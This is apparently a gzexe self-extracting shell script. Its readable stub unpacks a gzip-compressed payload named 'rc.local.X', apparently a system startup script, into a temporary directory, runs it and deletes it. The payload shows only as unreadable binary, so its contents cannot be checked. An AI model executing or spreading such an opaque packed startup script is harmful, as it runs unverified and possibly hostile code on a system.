#!/bin/sh
skip=49

tab='	'
nl='
'
IFS=" $tab$nl"

umask=`umask`
umask 77

gztmpdir=
trap 'res=$?
  test -n "$gztmpdir" && rm -fr "$gztmpdir"
  (exit $res); exit $res
' 0 1 2 3 5 10 13 15

case $TMPDIR in
  / | /*/) ;;
  /*) TMPDIR=$TMPDIR/;;
  *) TMPDIR=/tmp/;;
esac
if type mktemp >/dev/null 2>&1; then
  gztmpdir=`mktemp -d "${TMPDIR}gztmpXXXXXXXXX"`
else
  gztmpdir=${TMPDIR}gztmp$$; mkdir $gztmpdir
fi || { (exit 127); exit 127; }

gztmp=$gztmpdir/$0
case $0 in
-* | */*'
') mkdir -p "$gztmp" && rm -r "$gztmp";;
*/*) gztmp=$gztmpdir/`basename "$0"`;;
esac || { (exit 127); exit 127; }

case `printf 'X\n' | tail -n +1 2>/dev/null` in
X) tail_n=-n;;
*) tail_n=;;
esac
if tail $tail_n +$skip <"$0" | gzip -cd > "$gztmp"; then
  umask $umask
  chmod 700 "$gztmp"
  (sleep 5; rm -fr "$gztmpdir") 2>/dev/null &
  "$gztmp" ${1+"$@"}; res=$?
else
  printf >&2 '%s\n' "Cannot decompress $0"
  (exit 127); res=127
fi; exit $res
��C�`rc.local.X ��K�@���+���d���P��u)e-�R�
��'�h�Yvfi���
�(�g-v��j�������$��3�	h���}���7�����s��`�AAà���%B��v���hw;�_,w.{;��p�g�����m�G{���eo-Z������6ï���������Nu �3<��������˵��^���
���~�ҽ�^�4  �Wꡫ�ӧ�X�2�O�k��^����W�"qݺ�6,�)���	�-E!̀��TaԷ*�Wx�
�l�9hh`|��`$Y� �f���%�HJ��(�hLkH� B��{�\��P4�\��r,#�7���ֆ85��K����ԓJ9�������I�:1�윐LDbRfN�{���t*2u�1͸iٯ��̳�%�LL�5�[�R��ż.�J4�b�襡����Iഀ�'�p�m)u��۶���o3[���L�ӻy�8�l+hm���nQ�y��IOB$=	Q�4�\Ec�E�  